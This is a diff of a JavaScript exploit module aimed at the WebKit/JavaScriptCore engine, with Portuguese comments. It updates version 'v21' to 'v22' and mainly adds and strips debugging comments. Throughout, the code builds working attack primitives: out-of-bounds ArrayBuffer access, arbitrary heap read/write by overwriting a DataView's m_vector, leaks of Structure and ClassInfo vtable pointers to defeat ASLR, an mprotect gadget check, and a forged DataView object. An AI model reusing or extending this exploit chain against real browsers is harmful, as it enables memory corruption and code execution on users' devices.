@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v21 - Calculo ASLR CORRETO da Base WebKit)
+// js/script3/testArrayBufferVictimCrash.mjs (v22 - Depuracao ASLR ClassInfo)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
@@ -17,12 +17,12 @@ import {
     selfTestOOBReadWrite,
     oob_read_absolute,
     oob_write_absolute,
-    setupOOBMetadataForArbitraryAccess // Importar a nova função
+    setupOOBMetadataForArbitraryAccess
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v21 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
+export const FNAME_MODULE = "v22 - Depuracao ASLR ClassInfo"; // Versão ATUALIZADA para depuração
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -51,7 +51,8 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1); // Remover logFn daqui, arbRead/arbReadUniversal já têm seu próprio log
+                    // Chamar arbReadFn sem passar logFn novamente para evitar logs duplicados
+                    const byte = await arbReadFn(address.add(i + j), 1); 
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -98,6 +99,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
             default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
         }
     } finally {
+        // Certifique-se de que a restauração é feita com o `logFn` passado
         await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
     return result;
@@ -128,6 +130,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
             default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
         }
     } finally {
+        // Certifique-se de que a restauração é feita com o `logFn` passado
         await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
     return value;
@@ -208,8 +211,6 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
 
         if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
             logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
-            // IMPORTANTE: Restaurar o valor original do m_vector do DataView forjado para zero ou um valor seguro.
-            // A arb_read/write_universal_js_heap já faz isso, mas uma garantia extra é boa.
             return true;
         } else {
             logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
@@ -318,10 +319,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let webkit_base_address = null;
     let found_m_mode = null;
 
-    // Declaração da variável fora do try/catch principal para evitar redeclaração
     let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
 
-    try { // <-- Este é o 'try' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+    try {
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
@@ -427,21 +427,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             {
                 field_0x34: TEST_VALUE_FOR_0X34,
                 field_0x40: TEST_VALUE_FOR_0X40,
-                // Adicione outros campos se a engenharia reversa confirmar sua utilidade
-                // field_0x28: TEST_VALUE_FOR_0X28,
-                // field_0x38: TEST_VALUE_FOR_0X38,
-                // field_0x30: TEST_VALUE_FOR_0X30
             }
         );
         logFn(`[ASLR LEAK] Metadados do oob_array_buffer_real ajustados para tentar bypass.`, "info");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
-        // structure_pointer_from_dummy_object_addr é o endereço do ponteiro para a Structure (dentro do JSCell)
         const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
 
         // --- Ponto de Depuração 1: Antes de ler o ponteiro da Structure ---
         logFn(`[ASLR LEAK DEBUG] Dump de memória ANTES de ler o ponteiro da Structure do dummy_object.`, "debug");
+        // O tamanho 0x60 é um chute razoável para ver campos próximos ao objeto. Ajuste conforme necessário.
         await dumpMemory(dummy_object_addr, 0x60, logFn, arb_read, "Structure_PreRead_Dump");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
@@ -463,7 +458,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         // --- Ponto de Depuração 2: Antes de ler a Vtable da ClassInfo ---
         logFn(`[ASLR LEAK DEBUG] Dump de memória ANTES de ler a Vtable da ClassInfo.`, "debug");
-        // Dumpar um pouco antes e depois do offset esperado da vtable dentro da ClassInfo
+        // Dumpar um pouco antes e depois do offset esperado da vtable dentro da ClassInfo.
+        // JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET é 0x8, então dumpar 0x10 antes e 0x40 depois é um bom começo.
         await dumpMemory(class_info_address.sub(0x10), 0x50, logFn, arb_read, "ClassInfo_PreVtableRead_Dump");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
@@ -503,7 +499,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
         const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
         logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-        const mprotect_first_bytes_check = await arb_read_universal_js_heap(mprotect_addr_check, 4, logFn); // Usar universal read
+        const mprotect_first_bytes_check = await arb_read_universal_js_heap(mprotect_addr_check, 4, logFn);
         
         // --- Ponto de Depuração 4: Dump de mprotect_plt_stub ---
         logFn(`[ASLR LEAK DEBUG] Dump de memória do mprotect_plt_stub para validação.`, "debug");
@@ -521,7 +517,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
         
-        // Atribuição aqui (não 'const' para evitar redeclaração)
         DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
         logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
 
@@ -654,11 +649,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             }
         };
 
-    } catch (e) { // <-- Este é o 'catch' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+    } catch (e) {
         final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
         final_result.success = false;
         logFn(final_result.message, "critical");
-    } finally { // <-- Este é o 'finally' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+    } finally {
         logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
         global_spray_objects = [];
         hold_objects = [];
